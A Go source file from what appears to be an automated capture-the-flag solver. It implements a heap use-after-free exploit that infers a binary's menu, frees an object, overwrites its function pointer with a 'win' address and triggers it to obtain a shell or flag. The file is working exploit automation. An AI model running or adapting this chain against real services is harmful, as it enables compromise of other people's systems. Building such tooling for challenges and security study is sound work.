package solve

import (
	"context"
	"regexp"
	"strconv"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// Heap support. This handles a common, no-leak heap bug: a use-after-free where a
// freed object's memory is written through a dangling pointer (or reclaimed by a
// same-size allocation), letting us overwrite an in-binary function pointer with a
// win function that a later "use" action calls. It drives a numbered menu inferred
// by keyword.
//
// The menu interaction is prompt-driven: after choosing an action, the strategy
// reads each sub-prompt and answers it by role (size / index / data), so it
// handles size-prompted allocators and index-driven edit/use/delete menus, not
// only the degenerate "one input per action" shape. It does NOT yet cover tcache
// fd poisoning or libc-hook overwrites (which need a heap/libc leak and, on glibc
// >= 2.32, defeating safe-linking), nor truly non-numeric (command-word) menus -
// those are the rest of the heap roadmap.

var menuLineRe = regexp.MustCompile(`(?m)^\s*(\d+)\s*[\.\)\:\-]\s*([A-Za-z][\w ]*)`)

// Sub-prompt classifiers. A freshly read prompt is matched against these to
// decide which field it asks for. Order of checking is size, then index, then
// data, so a bare "size" prompt is never mistaken for an index.
var (
	sizePromptRe  = regexp.MustCompile(`(?i)size|length|\blen\b|how many|how big|bytes|capacity`)
	indexPromptRe = regexp.MustCompile(`(?i)index|\bidx\b|slot|which|\bid\b|entry|chunk|number|position|\bno\b`)
	dataPromptRe  = regexp.MustCompile(`(?i)data|content|\bname\b|value|input|string|note|message|\bmsg\b|text|payload|write|fill`)
)

type promptRole int

const (
	roleUnknown promptRole = iota
	roleSize
	roleIndex
	roleData
)

type heapMenu struct {
	create, del, use, reclaim int
}

func keywordOption(labels map[int]string, kws ...string) int {
	for num, label := range labels {
		l := strings.ToLower(label)
		for _, k := range kws {
			if strings.Contains(l, k) {
				return num
			}
		}
	}
	return -1
}

// inferMenu reads the menu banner and maps the four actions the UAF chain needs.
// reclaim must be an allocation/edit that writes raw bytes WITHOUT resetting the
// object (so "create"/"add" are excluded from it).
func inferMenu(text string) (heapMenu, bool) {
	labels := map[int]string{}
	for _, m := range menuLineRe.FindAllStringSubmatch(text, -1) {
		n, err := strconv.Atoi(m[1])
		if err == nil {
			labels[n] = strings.TrimSpace(m[2])
		}
	}
	m := heapMenu{
		create:  keywordOption(labels, "create", "alloc", "add", "new", "malloc", "make"),
		del:     keywordOption(labels, "delete", "free", "remove", "del", "release"),
		use:     keywordOption(labels, "use", "call", "run", "trigger", "exec", "print", "show", "view", "read", "display"),
		reclaim: keywordOption(labels, "stash", "edit", "write", "fill", "store", "update", "modify", "set", "change"),
	}
	ok := m.create >= 0 && m.del >= 0 && m.use >= 0 && m.reclaim >= 0
	return m, ok
}

// lastPromptLine returns the last non-empty line of a read chunk, which is the
// actual prompt the program is waiting on (earlier lines are stale menu/confirm
// text). A prompt printed without a trailing newline (the common case) is the
// whole last line.
func lastPromptLine(text string) string {
	lines := strings.Split(text, "\n")
	for i := len(lines) - 1; i >= 0; i-- {
		if s := strings.TrimSpace(lines[i]); s != "" {
			return s
		}
	}
	return ""
}

// classifyPrompt maps a freshly read sub-prompt to the field it asks for. When
// the text looks like the main menu reappearing (two or more numbered option
// lines), it returns roleUnknown so the caller stops feeding the current action.
func classifyPrompt(text string) promptRole {
	if len(menuLineRe.FindAllStringSubmatch(text, -1)) >= 2 {
		return roleUnknown
	}
	tail := lastPromptLine(text)
	switch {
	case sizePromptRe.MatchString(tail):
		return roleSize
	case indexPromptRe.MatchString(tail):
		return roleIndex
	case dataPromptRe.MatchString(tail):
		return roleData
	}
	return roleUnknown
}

// heapUAFStrategy infers the menu and tries the UAF reclaim-and-overwrite chain
// for each candidate function-pointer offset (and, when the allocator prompts for
// a size, a few candidate sizes).
func (s *solver) heapUAFStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	hasMalloc, hasFree := false, false
	for _, imp := range bin.Imports {
		switch imp {
		case "malloc", "calloc", "realloc":
			hasMalloc = true
		case "free":
			hasFree = true
		}
	}
	if !hasMalloc || !hasFree {
		return false, nil
	}
	wins := orderedWinFunctions(bin)
	if len(wins) == 0 {
		return false, nil
	}
	win := wins[0].addr

	// Infer the menu once.
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	banner := string(conn.RecvUntilIdle(s.idle()))
	conn.Close()
	cleanup()
	menu, ok := inferMenu(banner)
	if !ok {
		s.report.Limitations = append(s.report.Limitations, "no conventional create/free/use/edit menu inferred; heap UAF strategy skipped")
		return false, nil
	}

	sizes := []int{32, 64, 16}
	for _, fnOff := range []int{0, 8, 16} {
		for _, sz := range sizes {
			if err := ctx.Err(); err != nil {
				return false, err
			}
			done, sizeMattered, err := s.heapUAFAttempt(ctx, menu, win, fnOff, sz)
			if err != nil || done {
				return done, err
			}
			// When the allocator never prompts for a size, every size produces an
			// identical run, so there is no point retrying with another.
			if !sizeMattered {
				break
			}
		}
	}
	return false, nil
}

// heapUAFAttempt drives create -> free -> edit(overwrite fn with win) -> use over
// one connection, answering each action's sub-prompts by role. It returns whether
// a flag was recovered and whether a size prompt was actually encountered (so the
// caller can skip redundant size retries on fixed-size allocators).
func (s *solver) heapUAFAttempt(ctx context.Context, m heapMenu, win uint64, fnOff, size int) (bool, bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, false, err
	}
	defer cleanup()
	defer conn.Close()

	var tr strings.Builder
	sizeSeen := false

	// act selects a menu choice and answers up to four sub-prompts by role. index
	// is the slot we operate on (always 0); data is the terminal field's bytes.
	act := func(choice, index int, data []byte) {
		tr.WriteString(string(conn.RecvUntilIdle(s.idle()))) // prompt/menu before the choice
		_ = conn.Send([]byte(strconv.Itoa(choice) + "\n"))
		for f := 0; f < 4; f++ {
			p := string(conn.RecvUntilIdle(s.idle()))
			tr.WriteString(p)
			switch classifyPrompt(p) {
			case roleSize:
				sizeSeen = true
				_ = conn.Send([]byte(strconv.Itoa(size) + "\n"))
			case roleIndex:
				_ = conn.Send([]byte(strconv.Itoa(index) + "\n"))
			case roleData:
				_ = conn.Send(data)
				return // data is the terminal field for an action
			default:
				return // menu reappeared or no further prompt; action complete
			}
		}
	}

	// The win payload is exactly long enough to overwrite the function pointer at
	// fnOff; keeping it minimal avoids spilling extra bytes into the next read on a
	// target whose edit reads fewer bytes than a fixed-width buffer would.
	payload := make([]byte, fnOff+8)
	for i := 0; i < 8; i++ {
		payload[fnOff+i] = byte(win >> (8 * i))
	}

	act(m.create, 0, []byte("AAAA\n")) // allocate obj 0 (fn = default)
	act(m.del, 0, nil)                 // free obj 0 (UAF; index-driven)
	act(m.reclaim, 0, payload)         // write freed chunk, overwrite fn with win
	act(m.use, 0, nil)                 // call obj 0's fn == win
	tr.WriteString(string(conn.RecvUntilIdle(s.idle())))
	_ = conn.Send([]byte(driveShell)) // in case win spawns a shell
	tr.WriteString(string(conn.RecvUntilIdle(s.idle())))

	out := tr.String()
	cands := s.ex.Find(out, []byte("heap-uaf-marker"), "session")
	note := "heap UAF fn-ptr overwrite, fn_offset=" + strconv.Itoa(fnOff)
	if sizeSeen {
		note += ", size=" + strconv.Itoa(size)
	}
	done := s.finalize("heap_uaf", note, payload, runner.Result{Outcome: "session", ExitCode: -1, Stdout: out}, cands)
	return done, sizeSeen, nil
}
